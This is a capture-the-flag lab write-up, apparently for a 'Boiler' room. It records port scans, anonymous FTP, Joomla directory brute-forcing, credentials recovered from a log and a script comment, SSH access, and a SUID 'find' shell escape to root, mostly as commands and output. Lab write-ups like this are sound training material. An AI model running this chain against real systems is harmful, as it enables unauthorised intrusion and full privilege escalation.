
Target IP - 10.48.143.153

## Recon

### Rustscan

| Services | Ports |
| -------- | ----- |
| http     | 80    |
| ftp      | 21    |
| ssh      | 55007 |
| webmin   | 1000  |

```Bash
#open ports scan
rustscan -a 10.48.143.153 -r 1-65535 -- -oN allports.txt
Open 10.48.143.153:21
Open 10.48.143.153:80
Open 10.48.143.153:10000
Open 10.48.143.153:55007

#service scans
rustscan -a 10.48.143.153 -- -sC -sV -oN services.txt
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 62 vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.159.0
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    syn-ack ttl 62 MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: C29123802EE4FDC91BD9BE2172F5C3F2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### FTP Access
```Bash
└─$ ftp 10.48.143.153                                                                                                                   
Connected to 10.48.143.153.
220 (vsFTPd 3.0.3)
Name (10.48.143.153:kali): anonymous
230 Login successful.
ftp> ls -al
229 Entering Extended Passive Mode (|||49697|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.

```

### Webmin Exploit search for version 1.9.30

```Bash
searchsploit webmin                 
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                  |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                                                 | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                                                | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                                            | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                                                        | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                                                               | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                                                     | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                                                         | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                                                              | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                                                                    | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                                                              | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                           | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                                                         | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                            | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                          | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                                            | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                               | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                                                                 | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                                                      | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                                                                | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                                                                                            | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                                                                                                      | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                                                                                                       | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                                    | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                                    | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                                   | linux/webapps/47330.rb
Webmin Usermin 2.100 - Username Enumeration                                                                                                                     | perl/webapps/52114.py

```
### Directory Brute force

```Bash
└─$ ffuf -u http://10.48.143.153:80/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200-299,301,302,307 -o ffuf.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.143.153:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Output file      : ffuf.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307
________________________________________________

manual                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 103ms]
joomla                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 99ms]

```

Joomla!!! CMS
Furthermore, drilling down to extract directories from Joomla CMS.

```Bash
┌──(kali㉿kali)-[~/Downloads/thm/boiler_ctf]
└─$ ffuf -u http://10.48.143.153:80/joomla/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.bak,.txt,.zip -mc 200,301 -o joomlaffuf.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.143.153:80/joomla/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 :: Extensions       : .php .bak .txt .zip 
 :: Output file      : joomlaffuf.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301
________________________________________________

templates               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 92ms]
cache                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 96ms]
modules                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 97ms]
media                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 97ms]
includes                [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 97ms]
language                [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 82ms]
tmp                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 83ms]
plugins                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 85ms]
components              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 88ms]
administrator           [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 93ms]
installation            [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 91ms]
bin                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 84ms]
libraries               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 86ms]
images                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 1542ms]
index.php               [Status: 200, Size: 12494, Words: 772, Lines: 259, Duration: 137ms]
tests                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 101ms]
layouts                 [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 105ms]
_test                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 82ms]
_archive                [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 91ms]
build                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 85ms]
README.txt              [Status: 200, Size: 4793, Words: 479, Lines: 72, Duration: 98ms]
_database               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 113ms]
_files                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 85ms]
configuration.php       [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 87ms]
htaccess.txt            [Status: 200, Size: 3159, Words: 449, Lines: 86, Duration: 91ms]
LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 89ms]
cli                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 97ms]
:: Progress: [149995/149995] :: Job [1/1] :: 438 req/sec :: Duration: [0:06:00] :: Errors: 5 ::

```

Useful URL - 
```URL
http://10.48.143.153:80/joomla/_test
```

Command injection is possible

![[Pasted image 20260119235050.png]]

we obtained creds from log.txt
```text
username - basterd
password - superduperp@$$
```

### Accessing users via SSH

```Bash
ssh basterd@10.48.143.153 -p 55007

$ ls
backup.sh
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi

```

Again we got creds
```text
stoner:superduperp@$$no1knows
```
### User.txt
```Bash
ssh stoner@10.48.143.153 -p 55007

stoner@Vulnerable:~$ ls -al
total 984
drwxr-x--- 6 stoner stoner   4096 Jan 19 20:03 .
drwxr-xr-x 4 root   root     4096 Aug 22  2019 ..
drwx------ 2 stoner stoner   4096 Jan 19 19:58 .cache
drwxr-x--- 3 stoner stoner   4096 Jan 19 20:03 .config
drwx------ 2 stoner stoner   4096 Jan 19 20:03 .gnupg
-rwxrwxr-x 1 stoner stoner 975444 Jan 19 20:01 linpeas.sh
drwxrwxr-x 2 stoner stoner   4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner     34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
stoner@Vulnerable:~$ 
```

### Linpeas.sh enumeration

```Bash
#sudo -l
User stoner may run the following commands on Vulnerable:                          (root) NOPASSWD: /NotThisTime/MessinWithYa

#intresting file with permissions
-r-sr-xr-x 1 root root 227K Feb  8  2016 /usr/bin/find
```
### Root.txt

reference link - https://gtfobins.github.io/gtfobins/find/#shell

```Bash
stoner@Vulnerable:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
# cat /root/root.txt
It wasn't that hard, was it?
# exit
```
